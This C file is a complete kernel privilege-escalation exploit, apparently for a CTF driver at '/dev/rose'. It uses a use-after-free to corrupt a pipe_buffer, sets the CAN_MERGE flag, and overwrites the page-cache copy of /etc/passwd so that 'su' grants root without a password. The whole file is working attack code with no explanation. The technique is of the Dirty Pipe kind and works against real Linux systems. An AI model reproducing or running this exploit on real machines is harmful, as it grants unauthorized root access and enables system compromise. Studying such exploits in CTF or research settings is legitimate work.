// gcc exploit.c -o exploit
#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/xattr.h>
#include <sys/prctl.h>

static void dump(void *buf, size_t size);

#define PAGE_SIZE (1<<12)
#define MSGMSG_HEADER_SIZE 0x30UL
#define PIPE_BUF_FLAG_CAN_MERGE	0x10

struct pipe_buffer {
	uintptr_t page;
	unsigned int offset, len;
	uintptr_t ops;
	unsigned int flags;
	unsigned long private;
};

struct pipe_pair {
    union {
        struct {
            int out;
            int in;
        };
        int __raw[2];
    };
};

int main(int argc, char *argv[]){
	int passwd_fd;
	int rose_fds[3];
	struct pipe_pair pipe_fd;
	char msg_buf[PAGE_SIZE - MSGMSG_HEADER_SIZE + 0x400];
	char buf[PAGE_SIZE] = {};

	if((passwd_fd = open("/etc/passwd", O_RDONLY)) < 0){
		perror("passwd");
		return -1;
	}

	for(int i=0; i<3; i++)
		if((rose_fds[i] = open("/dev/rose", O_RDWR)) < 0){
			perror("/dev/rose");
			return -1;
		}
	close(rose_fds[0]);

  	int qid = msgget(IPC_PRIVATE, IPC_CREAT | 0666);
	memset(msg_buf, 0x41, sizeof(msg_buf));
	msgsnd(qid, msg_buf, sizeof(msg_buf)-8, 0);

	close(rose_fds[1]);

	pipe(pipe_fd.__raw);
	write(pipe_fd.in, buf, sizeof(buf)); // 0
	read(pipe_fd.out, buf, sizeof(buf));  // 0

	close(rose_fds[2]);
	pipe((int[]){0,0}); // clear page

	lseek(passwd_fd, 3, SEEK_SET);
	splice(passwd_fd, NULL, pipe_fd.in, NULL, 1, 0); // 1

	msgrcv(qid, msg_buf, sizeof(msg_buf)-8, 0, MSG_NOERROR);

	struct pipe_buffer *pipe_buff = (void*)msg_buf + PAGE_SIZE - MSGMSG_HEADER_SIZE;
	/*
	dump(pipe_buff, 0x200);
	uintptr_t addr_passwd_page   = pipe_buff[1].page;
	uintptr_t addr_page_cache_pipe_buf_ops = pipe_buff[1].ops;
	uintptr_t addr_kernel_rodata = addr_page_cache_pipe_buf_ops - 0x1f420;
	printf("[+] addr_passwd_page	= %p\n", (void*)addr_passwd_page);
	printf("[+] addr_kernel_rodata 	= %p\n", (void*)addr_kernel_rodata);
	 */

	pipe_buff[1].flags |= PIPE_BUF_FLAG_CAN_MERGE;
	setxattr("/tmp", "x", pipe_buff, 0x400, XATTR_CREATE);
	write(pipe_fd.in, "x:", 2);

	execve("/bin/su", (char *[]){"su", "rootx", NULL}, NULL);

	puts("fail");
	return -1;
}

static void dump(void *buf, size_t size){
	uint64_t *p = buf;

	printf("=== DUMP (%p-%p) ===\n", buf, buf+size);
	for(uint64_t i=0; i<size/8; i++){
		printf("%016lx ", p[i]);
		if(i%4 == 3)
			printf("\n");
	}
	printf("\n");
}
